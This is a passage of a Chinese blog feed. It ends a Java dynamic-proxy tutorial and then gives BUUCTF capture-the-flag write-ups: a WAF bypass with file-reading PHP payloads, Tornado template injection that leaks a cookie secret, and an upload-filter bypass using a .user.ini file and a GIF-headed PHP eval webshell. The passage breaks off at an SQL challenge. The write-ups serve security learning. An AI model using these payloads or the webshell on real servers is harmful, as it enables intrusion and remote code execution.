class="hljs-string">&quot;开始&quot;</span>);<br>       Object res=  method.invoke(demo, args);<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>重写invoke方法，把原来静态代理中代理类要完成的功能，放在重写之后的invoke方法中实现。</strong></p><p><strong>invoke方法表示代理对象要执行的功能代码。</strong></p><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                          InvocationHandler h)</span><br>        <span class="hljs-keyword">throws</span> IllegalArgumentException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Look up or generate the designated proxy class.</span><br><span class="hljs-comment">         */</span><br>        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="hljs-comment">// stack walk magic: do not refactor</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> h;<br>            <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-literal">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;<br>                <span class="hljs-comment">// create proxy instance with doPrivilege as the proxy class may</span><br>                <span class="hljs-comment">// implement non-public interfaces that requires a special permission</span><br>                <span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;<br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>                    &#125;<br>                &#125;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(e.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键函数:<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>主要就是生成代理类。</p><p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="代理类-1"><a href="#代理类-1" class="headerlink" title="代理类"></a>代理类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object factory;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(Object factory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        before();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>        after();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;开始&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>&#125; #这一段代码其实就是为了创建代理对象，并且会执行hander中的invoke方法<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>#这个其实就是为了实现修改的部分，其 <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;...&#125;会被<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;...&#125;触发<br></code></pre></td></tr></table></figure><h4 id="创建接口"><a href="#创建接口" class="headerlink" title="创建接口"></a>创建接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppleShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AppleShop</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃苹果啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BannerShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃香蕉啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现类-2"><a href="#实现类-2" class="headerlink" title="实现类"></a>实现类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AppleShopReal</span> <span class="hljs-variable">appleShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleShopReal</span>();<br>        <span class="hljs-type">Company</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Company</span>();<br>        company.setFactory(appleShopReal);<br>        <span class="hljs-type">AppleShop</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (AppleShop) company.getProxyInstance();<br>        proxyInstance.Apple();<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-type">BannerShopReal</span> <span class="hljs-variable">bannerShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BannerShopReal</span>();<br>        company.setFactory(bannerShopReal);<br>        <span class="hljs-type">BananerShop</span> <span class="hljs-variable">proxyInstance1</span> <span class="hljs-operator">=</span> (BananerShop) company.getProxyInstance();<br>        proxyInstance1.Bananer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在我翻阅大佬博客的时候有几点值得注意的地方。<br> <code>AppleShop proxyInstance = (AppleShop) company.getProxyInstance();</code>和<code>BananerShop proxyInstance1 = (BananerShop) company.getProxyInstance();</code></p><p><strong>不能强转实现类。</strong>原因：不能用接口的实现类来转换Proxy的实现类，因为他们是同级的（代理类本身继承了Proxy），应该用共同的接口来转换。<br>成功。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045630.png" alt="QQ截图20220225204149"></p>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2022/02/24/BUUCTF/"/>
    <url>/2022/02/24/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>有点乱，之前在等博客开通。</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>配置了好久的图床，之前用hexo+github的服务器搭建博客。现在重新用vps搭建博客，是真的麻烦，还要申请备案啥的。<br>给自己取了一个好听的id名—-Xsw6_a，但是很难受，因为很多时候下划线(_)，是非法字符。<br>先来做做这个比较简单的题嘿嘿。<br>emmm又要重新启动一下环境。<br>先来看看源代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214131745.png" alt="QQ截图20220214131745"></p><p>值得注意的几点。<br><strong>1.I’ve set up WAF to ensure security.</strong></p><p><strong>2.calc.php</strong></p><p>进入链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a></p><p>读取代码：<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214132112.png" alt="QQ截图20220214132112"></p><p>这里对我来说的新知识，了解一下foreach函数。（菜鸟教程）<br>正则过滤了一些字符。<br>构造num&#x3D;print_r(scandir(chr(47))),发现报错。<br>emmm….不会了。百度。<br>只需要将num之前打一个空格。<br>新链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(scandir(chr(47)))<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214133023.png" alt="QQ截图20220214133023"></p><p>读取f1agg。<br>这里附上字符串转ascii的java代码，就当复习java基础语法了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/f1agg&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length();i++)&#123;<br>            <span class="hljs-type">int</span> temp=(<span class="hljs-type">int</span>)a.charAt(i);<br>            <span class="hljs-comment">//得到当前字符的ascii</span><br>            System.out.println(temp);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完整链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>得到flag。</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>随便点点发现url中<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed</a><br>filehash的值，emmm第一眼就觉得是加密。<br>接着发现<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134238.png" alt="QQ截图20220214134238"></p><p>直接上加密。<br>但是找了一圈没有找到cookie。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134456.png" alt="QQ截图20220214134456"></p><p>回头又想到render。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214135041.png" alt="QQ截图20220214135041"></p><p>没有思路，就又查找wp了。<br>很奇妙，竟然联系到题目。跟着wp提示做一下。<br>一路跟到底…emmm<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140206.png" alt="QQ截图20220214140206"></p><p><strong>总结：handler 指向RequestHandler</strong></p><p><strong>而RequestHandler.settings又指向self.application.settings</strong></p><p><strong>所有handler.settings就指向RequestHandler.application.settings了！</strong></p><p>这里如果直接访问，会出现500的错误。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140724.png" alt="QQ截图20220214140724"></p><p>所以这里就体现出了，为什么要间接访问。<br>然后自己调试的一些问题：这里好像链接构造成：0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81&#x2F;error?msg&#x3D;</p><p>msg后面输入什么，页面就会返回什么。跟作者说的ssti我觉得有问题。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214141140.png" alt="QQ截图20220214141140"></p><p>这里如果是计算表达式就是不行。但是这里确实是符合ssti，emmm不理解。</p><p>管他呢，继续做叭。<br>构造链接：<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=</a></p><p>得到cookie，然后就去写代码咯。自己对着敲一遍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-comment">#创建MD5加密对象</span><br><span class="hljs-built_in">hash</span>.update(<span class="hljs-string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><span class="hljs-comment">#更新对象要加密的字符串，要先UTF-8编码成二进制，因为md5只加密二进制</span><br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((<span class="hljs-string">&quot;20d70faf-6981-4604-ba00-9f57cb0c2569&quot;</span>+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br></code></pre></td></tr></table></figure><p>就是注释md5加密又学到知识了。</p><p>最终链接:<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、如果url中参数屏蔽了字母，可在参数前+一个小空格。</p><p>2、scandir、print_f、file_get_contents等函数</p><p>3、看到render参数可联系到模板，联系到ssti，Tornado提供别名快速访问对象。</p><p>4、RequestHandler.application.settings目前不知道具体作用，中文翻译一下  请求处理程序 .申请.设置 估摸这就是查看cookie？</p><p>当然这里直接通过 handler.settings。</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>打开题目是上传文件。有源码先看源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);<br>if (!file_exists($userdir)) &#123;<br>    mkdir($userdir, 0777, true);<br>&#125;<br>file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);<br>if (isset($_POST[&quot;upload&quot;])) &#123;<br>    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];<br>    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];<br>    if (!$tmp_name) &#123;<br>        die(&quot;filesize too big!&quot;);<br>    &#125;<br>    if (!$name) &#123;<br>        die(&quot;filename cannot be empty!&quot;);<br>    &#125;<br>    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);<br>    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;<br>        die(&quot;illegal suffix!&quot;);<br>    &#125;<br>    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;<br>        die(&quot;&amp;lt;? in contents!&quot;);<br>    &#125;<br>    $image_type = exif_imagetype($tmp_name);<br>    if (!$image_type) &#123;<br>        die(&quot;exif_imagetype:not image!&quot;);<br>    &#125;<br>    $upload_file_path = $userdir . &quot;/&quot; . $name;<br>    move_uploaded_file($tmp_name, $upload_file_path);<br>    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;<br>    echo &#x27;Your files : &lt;br&gt;&#x27;;<br>    var_dump(scandir($userdir));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222210628.png" alt="QQ截图20220222210628"></p><p>过滤了 <strong>&lt;?</strong><br>然后可以上传图像类型的文件。<br>这里就让我想到了上传.htacess，但是文章中也是过滤掉了。<br>(这里就走头无路了，看看wp，提示到apache是可以用.htacess，而这里用的服务器niginx)</p><p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx&#x2F;apache&#x2F;IIS都有效，而<code>.htaccess</code>只适用于apache</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222211627.png" alt="QQ截图20220222211627"></p><p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p><p>在p牛的文章中提到了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p><p>我们再到手册中看了下这两个设置的定义：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212237.png" alt="QQ截图20220222212237"></p><p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>（这里就是为什么要写入跟上传文件的图片一个命名的原因。）</p><p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）。</p><h3 id="解题步骤（方法一）"><a href="#解题步骤（方法一）" class="headerlink" title="解题步骤（方法一）"></a>解题步骤（方法一）</h3><p>1、上传.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p>2、上传a.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3、访问上传的文件路径。<strong>upload&#x2F;md5(*)</strong><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212917.png" alt="QQ截图20220222212917"></p><p>得到flag。</p><h3 id="绕过exif-imagetype-的奇技淫巧（解题方法二）"><a href="#绕过exif-imagetype-的奇技淫巧（解题方法二）" class="headerlink" title="绕过exif_imagetype()的奇技淫巧（解题方法二）"></a>绕过<code>exif_imagetype()</code>的奇技淫巧（解题方法二）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 10</span><br></code></pre></td></tr></table></figure><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br> 在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br> XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br> 也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br> <code>#define test_width 16</code><br> <code>#define test_height 7</code></p><p>只需将上述文件中的GIF89a改为 </p><p>#define width 20</p><p>#define height 10</p><p>即可。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>尝试很多次都是失败。然后突然发现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223162344.png" alt="QQ截图20220223162344"></p><p>这是一个什么编码呢？尝试许久不知道。查了查wp。是base32。然后是base64。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 